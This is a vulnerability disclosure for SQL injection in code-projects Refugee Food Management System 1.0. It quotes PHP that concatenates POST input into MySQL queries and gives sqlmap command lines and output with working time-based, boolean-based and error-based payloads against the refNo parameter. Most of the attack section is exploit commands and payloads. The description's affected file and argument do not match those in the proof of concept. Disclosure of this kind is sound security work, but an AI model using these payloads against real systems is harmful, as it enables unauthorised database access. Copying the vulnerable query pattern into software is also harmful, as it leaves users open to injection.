# SQLi in code-projects Refugee Food Management System 1.0 of file /home/viewtakenfd.php

**vender**:

- https://code-projects.org/refugee-food-management-system-in-php-with-source-code/

**SoftLink**:

- https://download.code-projects.org/details/491fdab9-7421-418b-93a2-bb506ba9cf02

**Vulnerable File**

- /home/viewtakenfd.php

**Version**

- V1.0

**Description**

A vulnerability was determined in code-projects Refugee Food Management System 1.0. The affected element is an unknown function of the file /home/viewtakenfd.php. This manipulation of the argument a causes sql injection. The attack is possible to be carried out remotely. The exploit has been publicly disclosed and may be utilized.

### Analyse

**injection point: `$_POST['refNo']`, `$_POST['food'][]`, `$_POST['b'][]`**

```php
$slquery =("SELECT 1 FROM  refugee WHERE refNo='$id'");
$selectresult = mysql_query($slquery);
    if(mysql_num_rows($selectresult)>0)
    {
$sql=mysql_query("UPDATE refugee SET received ='yes' WHERE refNo='$id'") or mysql_error();
$sql=mysql_query("UPDATE foodreg SET qtyleft =qtyleft -$qty, qtytaken =qtytaken +$qty WHERE fdid='" . $_POST["food"][$i] . "'") or mysql_error();
$sql=mysql_query("INSERT  INTO  takenfood VALUES ('','$date','$qty','$fid','$id')");
```

### POC

```bash
sqlmap -u "http://192.168.93.1/Refugee/home/served.php" --data="refNo=1&food[]=1&a[]=posho&b[]=1&Register=Register" --cookie="PHPSESSID=b18e5od9eis7dbshtjrca24fs0"
--dbms=mysql --tamper unmagicquotes --level=2 --thread=10 --batch --flush-session
```

```
---
Parameter: refNo (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: refNo=1'+(SELECT 0x5248674a WHERE 9226=9226 AND (SELECT 8318 FROM (SELECT(SLEEP(5)))Vufe))+'&food[]=1&a[]=posho&b[]=1&Register=Register
---
---
Parameter: refNo (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: refNo=1' OR NOT 04245=4245-- wXyW&food[]=1&a[]=posho&b[]=1&Register=Register

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
    Payload: refNo=1'XOR(if(now()=sysdate(),SLEEP(8),0))XOR'Z&food[]=1&a[]=posho&b[]=1&Register=Register
---
```

![image-20251224162448832](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512241624936.png)



```
sqlmap -u "http://192.168.93.1/Refugee/home/served.php" --cookie="PHPSESSID=0rh7nel8tcbsj3rg6b1fb6lr64" --data="refNo=test&food[]=4&a[]=bread&b[]=1&Register=Register" --level=2
```

```
---
Parameter: refNo (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: refNo=test' AND 3570=3570 AND 'tart'='tart&food[]=4&a[]=bread&b[]=1&Register=Register

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: refNo=test' OR (SELECT 7924 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT (ELT(7924=7924,1))),0x717a7a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND
'gQRL'='gQRL&food[]=4&a[]=bread&b[]=1&Register=Register

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: refNo=test' AND (SELECT 7379 FROM (SELECT(SLEEP(5)))kpZw) AND 'WkMh'='WkMh&food[]=4&a[]=bread&b[]=1&Register=Register
---
```



![image-20251224170120632](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512241701746.png)